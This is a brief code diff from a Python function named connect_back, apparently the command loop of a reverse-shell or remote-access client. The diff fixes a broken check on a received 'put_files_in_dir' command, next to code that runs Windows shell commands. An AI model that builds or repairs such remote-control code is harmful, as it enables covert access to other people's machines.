@@ -308,7 +308,7 @@ def connect_back():
                 for folder in parts:
                     subprocess.run(["cmd", "/c", "mkdir", folder], shell=True)
                 continue
-            if cmd.lower().startswith() == "put_files_in_dir":
+            if cmd.lower().startswith("put_files_in_dir"):
                 args = cmd.split(' ')
                 put_files_in_dir(args)
                 continue
